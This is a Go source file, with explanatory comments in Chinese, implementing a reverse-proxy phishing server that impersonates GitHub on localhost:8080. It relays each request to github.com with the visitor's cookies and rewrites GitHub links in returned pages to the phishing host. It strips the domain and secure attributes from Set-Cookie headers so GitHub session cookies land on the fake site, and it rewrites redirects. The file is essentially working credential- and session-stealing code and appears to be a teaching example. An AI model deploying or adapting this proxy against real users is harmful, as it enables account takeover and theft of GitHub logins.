package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
)

const (
	upstreamURL = "https://github.com"
	phishURL    = "http://localhost:8080"
)

func replaceURLInResp(body []byte, header http.Header) []byte {
	// detect is html or not
	contentType := header.Get("Content-Type")
	isHTML := strings.Contains(contentType, "text/html")
	// if NOT, return same body
	if !isHTML {
		return body
	}
	bodyStr := string(body)
	bodyStr = strings.Replace(bodyStr, upstreamURL, phishURL, -1)

	phishGitURL := fmt.Sprintf(`%s(.*)\.git`, phishURL)
	upstreamGitURL := fmt.Sprintf(`%s$1.git`, upstreamURL)
	re, err := regexp.Compile(phishGitURL)
	if err != nil {
		panic(err)
	}
	bodyStr = re.ReplaceAllString(bodyStr, upstreamGitURL)
	return []byte(bodyStr)
}

func cloneRequest(r *http.Request) *http.Request {
	// 取得原請求的 method、body
	method := r.Method
	body := r.Body

	// 取得原請求的 url，把它的域名替換成真正的 Github
	path := r.URL.Path
	rawQuery := r.URL.RawQuery
	url := "https://github.com" + path + "?" + rawQuery

	// 建立新的 http.Request
	req, err := http.NewRequest(method, url, body)
	if err != nil {
		panic(err)
	}
	// 把原請求的 cookie 複製到 req 的 cookie 裡面
	// 這樣請求被發到 Github 時就會帶上 cookie
	req.Header["Cookie"] = r.Header["Cookie"]
	return req
}

func sendReqToUpstream(req *http.Request) ([]byte, http.Header, int) {
	checkRedirect := func(r *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}
	// 建立 http client
	client := http.Client{CheckRedirect: checkRedirect}

	// client.Do(req) 會發出請求到 Github、得到回覆 resp
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	// 把回覆的 body 從 Reader（串流）轉成 []byte
	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	resp.Body.Close()

	// 回傳 body
	return respBody, resp.Header, resp.StatusCode
}

func handler(w http.ResponseWriter, r *http.Request) {
	req := cloneRequest(r)
	// 取得 header
	body, header, statusCode := sendReqToUpstream(req)
	// 用 range 把 header 中的 Set-Cookie 欄位全部複製給瀏覽器的 header
	for _, v := range header["Set-Cookie"] {
		// 把 domain=.github.com 移除
		newValue := strings.Replace(v, "domain=.github.com;", "", -1)

		// 把 secure 移除
		newValue = strings.Replace(newValue, "secure;", "", 1)

		w.Header().Add("Set-Cookie", newValue)

	}
	// 如果 status code 是 3XX 就取代 Location 網址
	if statusCode >= 300 && statusCode < 400 {
		location := header.Get("Location")
		newLocation := strings.Replace(location, upstreamURL, phishURL, -1)
		w.Header().Set("Location", newLocation)
	}

	// 轉傳正確的 status code 給瀏覽器
	w.WriteHeader(statusCode)
	w.Write(body)
}

func main() {
	http.HandleFunc("/", handler)
	err := http.ListenAndServe(":8080", nil)
	if err != nil {
		panic(err)
	}
}
